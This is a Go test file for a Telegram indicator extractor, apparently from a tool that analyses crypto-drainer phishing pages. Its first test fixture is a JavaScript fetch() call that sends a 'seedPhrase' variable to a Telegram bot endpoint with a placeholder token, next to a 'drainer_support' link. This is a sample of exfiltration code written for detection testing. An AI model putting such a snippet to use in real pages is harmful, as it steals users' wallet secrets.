package telegram_test

import (
	"testing"

	"github.com/alexiares/alexiares/internal/telegram"
)

func TestExtractDetectsAllIndicators(t *testing.T) {
	text := `
		fetch("https://api.telegram.org/bot123456789:AAExampleTokenValue1234567890123456/sendMessage", {
			body: JSON.stringify({chat_id: "-1001234567890", text: seedPhrase})
		});
		join us at t.me/drainer_support for updates
	`

	got := telegram.Extract(text)

	if len(got.BotTokens) != 1 || got.BotTokens[0] != "123456789:AAExampleTokenValue1234567890123456" {
		t.Errorf("BotTokens = %v, want the extracted token", got.BotTokens)
	}
	if len(got.APIRefs) != 1 {
		t.Errorf("APIRefs = %v, want 1 match", got.APIRefs)
	}
	if len(got.Links) != 1 || got.Links[0] != "t.me/drainer_support" {
		t.Errorf("Links = %v, want [t.me/drainer_support]", got.Links)
	}
	if len(got.ChatIDs) != 1 || got.ChatIDs[0] != "-1001234567890" {
		t.Errorf("ChatIDs = %v, want [-1001234567890]", got.ChatIDs)
	}
}

func TestExtractNoIndicatorsInBenignText(t *testing.T) {
	got := telegram.Extract("this is a perfectly normal landing page with no exfiltration")
	if len(got.BotTokens) != 0 || len(got.APIRefs) != 0 || len(got.Links) != 0 || len(got.ChatIDs) != 0 {
		t.Errorf("Extract(benign) = %+v, want all empty", got)
	}
}

func TestExtractDeduplicates(t *testing.T) {
	text := "t.me/samechannel and again t.me/samechannel"
	got := telegram.Extract(text)
	if len(got.Links) != 1 {
		t.Errorf("Links = %v, want deduplicated to 1", got.Links)
	}
}
